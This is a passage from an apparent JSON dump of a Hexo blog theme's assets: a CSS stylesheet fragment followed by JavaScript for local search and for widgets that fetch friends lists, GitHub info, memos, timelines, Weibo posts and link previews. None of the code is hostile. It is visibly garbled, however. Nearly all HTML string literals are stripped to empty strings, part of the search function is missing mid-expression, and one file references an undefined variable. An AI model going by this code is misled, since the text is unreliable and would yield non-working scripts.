p:not([class]) a:not([class]), table a:not([class]) { position: relative; text-decoration: none; transition: all 0.2s ease-out; -moz-transition: all 0.2s ease-out; -webkit-transition: all 0.2s ease-out; -o-transition: all 0.2s ease-out; padding: 0 2px; border-radius: 0; color: inherit; background: linear-gradient(0deg, var(--theme-link), var(--theme-link)) no-repeat left 100%/100% 1px; } li:not([class]) a:not([class]):hover, p:not([class]) a:not([class]):hover, table a:not([class]):hover { text-decoration: none; color: var(--theme-link); border-radius: 4px; background: linear-gradient(0deg, var(--theme-link-opa), var(--theme-link-opa)) no-repeat left 100%/100% 100%; } li:not([class]) a:not([class]):has(img), p:not([class]) a:not([class]):has(img), table a:not([class]):has(img) { background: none; padding: 0; } li:not([class]) a:not([class]):has(img):hover, p:not([class]) a:not([class]):has(img):hover, table a:not([class]):has(img):hover { background: none; } .md-text .aplayer { border-radius: 12px; } img.lazy { transition: all 0.38s ease-out; -moz-transition: all 0.38s ease-out; -webkit-transition: all 0.38s ease-out; -o-transition: all 0.38s ease-out; } img.lazy:not(.loaded) { opacity: 0; } img.lazy.loaded, img.lazy.error { opacity: 1; } :root { --swiper-theme-color: #1cd0fd !important; } .swiper { width: 100%; border-radius: 4px; --gap-p: 2rem; } .swiper:not(.swiper-initialized) { display: none; } div.swiper-slide { text-align: center; display: -webkit-box; display: -ms-flexbox; display: -webkit-flex; display: flex; align-self: center; -webkit-box-pack: center; -ms-flex-pack: center; -webkit-justify-content: center; justify-content: center; -webkit-box-align: center; -ms-flex-align: center; -webkit-align-items: center; align-items: center; width: 50%; } div.swiper-slide img { border-radius: 4px; } .swiper[width='max'] .swiper-slide { width: 100%; } .swiper[width='min'] .swiper-slide { width: 25%; } .swiper[effect='cards'] .swiper-slide { max-width: 75%; } .swiper-button-prev, .swiper-button-next { padding: 1rem 0.25rem; margin-top: -2rem !important; border-radius: 40px; background: rgba(255,255,255,0.25); transition: background 0.2s ease-out; -moz-transition: background 0.2s ease-out; -webkit-transition: background 0.2s ease-out; -o-transition: background 0.2s ease-out; --swiper-theme-color: var(--text) !important; } .swiper-button-prev:after, .swiper-button-next:after { font-size: 1.2rem !important; font-weight: 700 !important; color: var(--swiper-theme-color); } .swiper-button-prev:hover, .swiper-button-next:hover { background: #fff !important; --swiper-theme-color: #ff5724 !important; } .swiper-button-prev:after { transform: translateX(-1px); } .swiper-button-next:after { transform: translateX(1px); } img[data-fancybox], a[data-fancybox] { cursor: zoom-in; } .highlight { position: relative; } .highlight .code .copy-btn { position: absolute; top: 0; right: 0; padding: 0px 0.5rem; font-weight: 700; visibility: hidden; border-bottom-left-radius: 8px; border-bottom-right-radius: 8px; background: var(--card); display: block; cursor: pointer; margin-right: 4px; margin-top: 4px; border-radius: calc(12px - 4px); } .highlight:hover .code:before { visibility: hidden; } .highlight:hover .copy-btn { visibility: visible; } .highlight .code .copy-btn.success { background: #3dc550; color: #fff; visibility: visible; } .highlight .code .copy-btn.warning { background: #fa6400; color: #fff; visibility: visible; } .md-text .folding[child=codeblock] .code .copy-btn { z-index: 1; margin-right: 1rem; border-radius: 8px; }"},{"path":"/assets/js/search/local-search.js","content":"// A local search script with the help of // [hexo-generator-search](https://github.com/PaicHyperionDev/hexo-generator-search) // Copyright (C) 2015 // Joseph Pan // Shuhao Mao // This library is free software; you can redistribute it and/or modify // it under the terms of the GNU Lesser General Public License as // published by the Free Software Foundation; either version 2.1 of the // License, or (at your option) any later version. // // This library is distributed in the hope that it will be useful, but // WITHOUT ANY WARRANTY; without even the implied warranty of // MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU // Lesser General Public License for more details. // // You should have received a copy of the GNU Lesser General Public // License along with this library; if not, write to the Free Software // Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA // 02110-1301 USA // // Modified by: // Pieter Robberechts /*exported searchFunc*/ var searchFunc = function(path, filter, wrapperId, searchId, contentId) { function getAllCombinations(keywords) { var i, j, result = []; for (i = 0; i < keywords.length; i++) { for (j = i + 1; j < keywords.length + 1; j++) { result.push(keywords.slice(i, j).join(\" \")); } } return result; } $.ajax({ url: path, dataType: \"json\", success: function(jsonResponse) { var datas = jsonResponse; var $input = document.getElementById(searchId); if (!$input) { return; } var $resultContent = document.getElementById(contentId); var $wrapper = document.getElementById(wrapperId); $input.addEventListener(\"input\", function(){ var resultList = []; var keywords = getAllCombinations(this.value.trim().toLowerCase().split(\" \")) .sort(function(a,b) { return b.split(\" \").length - a.split(\" \").length; }); $resultContent.innerHTML = \"\"; if (this.value.trim().length = 0 || indexContent >= 0 ){ matches += 1; if (indexContent < 0) { indexContent = 0; } if (firstOccur < 0) { firstOccur = indexContent; } } }); } // show search results if (matches > 0) { var searchResult = {}; searchResult.rank = matches; searchResult.str = \"\"+ dataTitle +\"\"; if (firstOccur >= 0) { // cut out 100 characters var start = firstOccur - 20; var end = firstOccur + 80; if(start < 0){ start = 0; } if(start == 0){ end = 100; } if(end > dataContent.length){ end = dataContent.length; } var matchContent = dataContent.substring(start, end); // highlight all keywords var regS = new RegExp(keywords.join(\"|\"), \"gi\"); matchContent = matchContent.replace(regS, function(keyword) { return \"\"+keyword+\"\"; }); searchResult.str += \"\" + matchContent +\"...\"; } searchResult.str += \"\"; resultList.push(searchResult); } }); if (resultList.length) { resultList.sort(function(a, b) { return b.rank - a.rank; }); var result =\"\"; for (var i = 0; i < resultList.length; i++) { result += resultList[i].str; } result += \"\"; $resultContent.innerHTML = result; } }); } }); }; utils.jq(() => { var $inputArea = $(\"input#search-input\"); if ($inputArea.length == 0) { return; } var $resultArea = document.querySelector(\"div#search-result\"); $inputArea.focus(function() { var path = ctx.search.path; if (path.startsWith('/')) { path = path.substring(1); } path = ctx.root + path; const filter = $inputArea.attr('data-filter') || ''; searchFunc(path, filter, 'search-wrapper', 'search-input', 'search-result'); }); $inputArea.keydown(function(e) { if (e.which == 13) { e.preventDefault(); } }); var observer = new MutationObserver(function(mutationsList, observer) { if (mutationsList.length == 1) { if (mutationsList[0].addedNodes.length) { $('.search-wrapper').removeClass('noresult'); } else if (mutationsList[0].removedNodes.length) { $('.search-wrapper').addClass('noresult'); } } }); observer.observe($resultArea, { childList: true }); });"},{"path":"/assets/js/services/fcircle.js","content":"utils.jq(() => { $(function () { const els = document.getElementsByClassName('ds-fcircle'); for (var i = 0; i < els.length; i++) { const el = els[i]; const api = el.getAttribute('api'); if (api == null) { continue; } const default_avatar = def.avatar; // layout utils.request(el, api, function(data) { const arr = data.article_data || []; const limit = el.getAttribute('limit'); arr.forEach((item, i) => { if (limit && i >= limit) { return; } var cell = ''; cell += ''; cell += ''; cell += ''; cell += '' + item.author + ''; cell += ''; cell += '' + item.created + ''; cell += ''; cell += ''; cell += item.title; cell += ''; cell += ''; $(el).append(cell); }); }); } }); });"},{"path":"/assets/js/services/friends.js","content":"utils.jq(() => { $(function () { const els = document.getElementsByClassName('ds-friends'); for (var i = 0; i < els.length; i++) { const el = els[i]; const api = el.getAttribute('api'); if (api == null) { continue; } const default_avatar = def.avatar; // layout utils.request(el, api, function(data) { for (let item of (data.content || data)) { var cell = ``; cell += ``;; cell += ``; cell += ``; cell += `${item.title || item.login}`; cell += ``; cell += ``; cell += ``; $(el).find('.grid-box').append(cell); } }); } }); });"},{"path":"/assets/js/services/ghinfo.js","content":"utils.jq(() => { $(function () { const els = document.getElementsByClassName('ds-ghinfo'); for (var i = 0; i < els.length; i++) { const el = els[i]; const api = el.getAttribute('api'); if (api == null) { continue; } // layout utils.request(null, api, function(data) { function fill(data) { for (let key of Object.keys(data)) { $(el).find(\"[type=text]#\" + key).text(data[key]); $(el).find(\"[type=link]#\" + key).attr(\"href\", data[key]); $(el).find(\"[type=img]#\" + key).attr(\"src\", data[key]); } } const idx = el.getAttribute('index'); if (idx != undefined) { const arr = data.content || data; if (arr && arr.length > idx) { let obj = arr[idx]; obj['latest-tag-name'] = obj['name']; fill(arr[idx]); } } else { fill(data); } }); } }); });"},{"path":"/assets/js/services/mdrender.js","content":"utils.jq(() => { const els = document.getElementsByClassName('ds-mdrender'); for (var i = 0; i < els.length; i++) { const el = els[i]; const src = `${el.getAttribute('src')}?t=${new Date().getTime()}`; utils.request(el, src, function(data) { el.innerHTML = marked.parse(resp.data); }); } });"},{"path":"/assets/js/services/memos.js","content":"utils.jq(() => { $(function () { const els = document.getElementsByClassName('ds-memos'); for (var i = 0; i < els.length; i++) { const el = els[i]; const api = el.getAttribute('api'); if (api == null) { continue; } const default_avatar = el.getAttribute('avatar') || def.avatar; const limit = el.getAttribute('limit'); const host = api.replace(/https:\\/\\/(.*?)\\/(.*)/i, '$1'); // layout utils.request(el, api, function(data) { var users = []; const filter = el.getAttribute('user'); if (filter && filter.length > 0) { users = filter.split(\",\"); } var hide = []; const hideStr = el.getAttribute('hide'); if (hideStr && hideStr.length > 0) { hide = hideStr.split(\",\"); } data.forEach((item, i) => { if (limit && i >= limit) { return; } if (item.user && item.user.login && users.length > 0) { if (!users.includes(item.user.login)) { return; } } let date = new Date(item.createdTs * 1000) var cell = ''; cell += ''; if (!users.length && !hide.includes('user')) { cell += ''; if (default_avatar.length > 0) { cell += ``; } cell += '' + item.creatorName + ''; cell += ''; } cell += '' + date.toLocaleString() + ''; cell += ''; cell += ''; cell += marked.parse(item.content || ''); var imgs = []; for (let res of item.resourceList) { if (res.type?.includes('image/')) { imgs.push(res); } } if (imgs.length > 0) { cell += ''; for (let img of imgs) { if (img.externalLink?.length > 0) { cell += ``; } else { cell += ``; } } cell += ''; } cell += ''; cell += ''; $(el).append(cell); }); }); } }); });"},{"path":"/assets/js/services/sites.js","content":"utils.jq(() => { $(function () { const els = document.getElementsByClassName('ds-sites'); for (var i = 0; i < els.length; i++) { const el = els[i]; const api = el.getAttribute('api'); if (api == null) { continue; } const default_avatar = def.avatar; const default_cover = def.cover; // layout utils.request(el, api, function(data) { for (let item of data.content) { var cell = ``; cell += ``; cell += ``; cell += ``; cell += ``; cell += `${item.title}`; cell += `${item.description || item.url}`; cell += ``; cell += ``; cell += ``; $(el).find('.grid-box').append(cell); } }); } }); });"},{"path":"/assets/js/services/siteinfo.js","content":"// 本插件由CardLink定制而成，原项目源码: https://github.com/Lete114/CardLink function setCardLink(nodes) { // If the `nodes` do not contain a `forEach` method, then the default `a[cardlink]` is used nodes = 'forEach' in (nodes || {}) ? nodes : document.querySelectorAll('a[cardlink]') nodes.forEach((el) => { // If it is not a tag element then it is not processed if (el.nodeType !== 1) return; el.removeAttribute('cardlink'); const api = el.getAttribute('api'); if (api == null) return; fetch(api).then(function(response) { if (response.ok) { return response.json(); } throw new Error('Network response was not ok.'); }).then(function(data) { var autofill = []; const autofillStr = el.getAttribute('autofill'); if (autofillStr) { autofill = autofillStr.split(','); } if (data.title && data.title.length > 0 && autofill.includes('title')) { el.querySelector('.title').innerHTML = data.title; el.title = data.title; } if (data.icon && data.icon.length > 0 && autofill.includes('icon')) { el.querySelector('.img').style = 'background-image: url(\"' + data.icon + '\");'; el.querySelector('.img').setAttribute('data-bg', data.icon); } let desc = el.querySelector('.desc'); if (desc && data.desc && data.desc.length > 0 && autofill.includes('desc')) { desc.innerHTML = data.desc; } }).catch(function(error) { console.error(error); }); }) }"},{"path":"/assets/js/services/timeline.js","content":"utils.jq(() => { $(function () { const reactions = { '+1': '👍', '-1': '👎', 'laugh': '😀', 'hooray': '🎉', 'confused': '😕', 'heart': '❤️', 'rocket': '🚀', 'eyes': '👀' } const timelines = document.getElementsByClassName('ds-timeline'); for (var i = 0; i < timelines.length; i++) { const el = timelines[i]; const api = el.getAttribute('api'); if (api == null) { continue; } // layout utils.request(el, api, function(data) { const query = new URL(api).search; const arr = data.content || data; var users = []; const filter = el.getAttribute('user'); if (filter && filter.length > 0) { users = filter.split(\",\"); } var hide = []; const hideStr = el.getAttribute('hide'); if (hideStr && hideStr.length > 0) { hide = hideStr.split(\",\"); } arr.forEach((item, i) => { if (item.user && item.user.login && users.length > 0) { if (!users.includes(item.user.login)) { return; } } var cell = ''; cell += ''; if (!users.length && item.user && !hide.includes('user')) { cell += ''; cell += ''; cell += '' + item.user.login + ''; cell += ''; } let date = new Date(item.created_at); cell += '' + date.toLocaleString() + ''; cell += ''; cell += ''; if (!hide.includes('title')) { cell += ''; cell += ''; cell += item.title || item.name || item.tag_name; cell += ''; cell += ''; } cell += marked.parse(item.body || ''); if (!hide.includes('footer')) { cell += ''; cell += ''; if (item.labels) { item.labels.forEach((label, i) => { if (!query || !query.includes(encodeURI(label.name))) { cell += ''; cell += '' + label.name + ''; cell += ''; } }); } else if (item.zipball_url) { cell += ''; cell += '📦 ' + item.tag_name + '.zip'; cell += ''; } cell += ''; cell += ''; if (item.reactions?.total_count > 0) { for (let key of Object.keys(reactions)) { let num = item.reactions[key]; if (num > 0) { cell += ''; cell += '' + reactions[key] + ' ' + item.reactions[key] + ''; cell += ''; } } } if (item.comments != null) { cell += ''; cell += ' ' + (item.comments || 0) + ''; cell += ''; } cell += ''; cell += ''; } cell += ''; cell += ''; $(el).append(cell); }); }); } }); });"},{"path":"/assets/js/services/weibo.js","content":"utils.jq(() => { $(function () { const els = document.getElementsByClassName('ds-weibo'); for (var i = 0; i < els.length; i++) { const el = els[i]; const api = el.getAttribute('api'); if (api == null) { continue; } const default_avatar = el.getAttribute('avatar') || def.avatar; // layout utils.request(el, api, function(data) { const arr = data.tweets || []; const limit = el.getAttribute('limit'); arr.forEach((item, i) => { if (limit && i >= limit) { return; } var cell = ''; cell += ''; cell += ''; cell += ''; cell += '' + data.user.nick_name + ''; cell += ''; cell += '' + item.created_at + ''; cell += ''; cell += ''; cell += ''; cell += item.content; cell += ''; // cell += ''; // 每条微博的右下角 转发 评论 点赞 cell += ''; cell += ''; cell += ''; cell += ''; cell += ''; cell += ''; cell += '' + '🔗' + ' ' + item.reposts_count + ''; cell += ''; cell += ''; cell += ''; cell += ' ' + (item.comments_count || 0) + ''; cell += ''; cell += ''; cell += ''; cell += '' + '👍' + ' ' + item.attitudes_count + ''; cell += ''; cell += ''; cell += ''; cell += ''; // 右下角结束 $(el).append(cell); }); }); } }); });"}]